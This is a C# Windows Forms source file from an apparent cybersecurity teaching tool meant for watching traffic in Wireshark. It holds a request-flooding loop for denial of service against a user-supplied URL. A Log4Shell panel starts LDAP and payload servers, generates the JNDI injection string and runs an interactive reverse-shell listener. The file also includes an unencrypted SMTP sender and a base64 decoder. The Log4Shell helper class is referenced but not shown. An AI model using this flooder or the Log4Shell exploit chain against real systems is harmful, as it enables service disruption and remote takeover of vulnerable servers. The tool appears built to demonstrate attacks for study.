using Microsoft.Extensions.Configuration;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace CybBezWireshark
{
    public partial class Form1 : Form
    {
        private readonly IConfiguration config;
        //DoS
        private readonly HttpClient httpClient;
        private bool SendRequests;
        private int Frequency;
        private string Url;

        //Log4Shell
        private readonly Log4Shell log4shell;
        private StreamWriter streamWriter = null;

        //EmailCapture
        private SmtpClient _smtp;

        public Form1(IConfiguration config)
        {
            InitializeComponent();
            this.config = config;

            //DoS
            this.httpClient = new HttpClient();
            button3.Enabled = false;
            backgroundWorker1.RunWorkerAsync();

            //Log4Shell
            radioButton2.Checked = true;
            payloadCodeBaseServerPort.Value = config.GetValue<int>("payloadCodeBaseServerPort");
            ldapServerPort.Value = config.GetValue<int>("ldapServerPort");
            reverseShellListenerPort.Value = config.GetValue<int>("reverseShellListenerPort");

            log4shell = new Log4Shell(config);
            log4shell.AcceptConnection += AcceptConnection;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                httpClient.GetAsync(textBox1.Text);
            }
            catch (Exception exc)
            {
            }
        }

        //DoS
        private void button2_Click(object sender, EventArgs e)
        {
            Url = textBox1.Text;
            Frequency = trackBar1.Value;
            trackBar1.Enabled = false;
            button2.Enabled = false;
            button3.Enabled = true;
            SendRequests = true;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            trackBar1.Enabled = true;
            button2.Enabled = true;
            button3.Enabled = false;
            SendRequests = false;
        }

        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            while (true)
                while (SendRequests)
                {
                    try
                    {
                        httpClient.GetAsync(Url);
                        Thread.Sleep(1000 / Frequency);
                    }
                    catch (Exception exc)
                    {
                    }
                }

        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (log4shell.IsRunning)
            {
                textBox4.Text = String.Empty;
                button4.Text = "Start";
                textBox3.Text = String.Empty;
                log4shell.ErrorLog -= ErrorLogToTerminal;
                log4shell.Stop();
            }
            else
            {
                log4shell.PayloadCodeBaseServerPort = (int)payloadCodeBaseServerPort.Value;
                log4shell.LdapServerPort = (int)ldapServerPort.Value;
                log4shell.ReverseShellListenerPort = (int)reverseShellListenerPort.Value;
                log4shell.ShowTerminals = radioButton2.Checked;

                textBox4.Text = log4shell.GetInjection();
                button4.Text = "Stop";

                textBox3.Text = $"Listening on 0.0.0.0:{log4shell.ReverseShellListenerPort}";
                log4shell.ErrorLog += ErrorLogToTerminal;

                log4shell.Start();
            }

        }

        private void AcceptConnection(string address, StreamReader reader, StreamWriter writer)
        {
            this.Invoke(new Action(() => textBox3.Text = $"Incoming connection from {address}\r\n...\r\n"));
            streamWriter = writer;
            while (true)
            {
                string? text = null;
                try
                {
                    text = ((char)reader.Read()).ToString();
                }
                catch { return; }
                if (text == null) return;

                text = text.Replace("\n", "\r\n");

                this.Invoke(new Action(() =>
                {
                    textBox3.AppendText(text);
                }));
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Clipboard.SetData(DataFormats.Text, (object)textBox4.Text);
        }

        private void ErrorLogToTerminal(string log)
        {
            textBox3.Text += log + "\r\n";
        }

        private void textBox2_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Return)
            {
                e.Handled = true;
                if (streamWriter is null) return;
                try 
                {
                    streamWriter.Write(textBox2.Text+"\n");
                    streamWriter.Flush();
                }
                catch { return; }
                this.Invoke(new Action(() =>
                {
                    textBox3.AppendText($"{textBox2.Text}\r\n");
                }));

                textBox2.Text = String.Empty;
            }
        }
        private void sendButton_Click(object sender, EventArgs e)
        {
            _smtp = new SmtpClient(serverTextBox.Text, (int)portNumericUpDown.Value);
            _smtp.EnableSsl = false;
            _smtp.Credentials = new NetworkCredential(loginTextBox.Text, passwordTextBox.Text);

            _smtp.Send(
                new MailMessage(senderTextBox.Text,
                recipientTextBox.Text,
                subjectTextBox.Text,
                bodyTextBox.Text
                ));

            _smtp.Dispose();
        }

        private void loginTextBox_TextChanged(object sender, EventArgs e)
        {
            senderTextBox.Text = loginTextBox.Text.Trim();
        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {
            try
            {
                var bytes = Convert.FromBase64String(DecoderInputTextBox.Text);
                DecoderOutputTextBox.Text = Encoding.UTF8.GetString(bytes);
            }
            catch { DecoderOutputTextBox.Text = "Niepoprawny kod"; }
        }
    }
}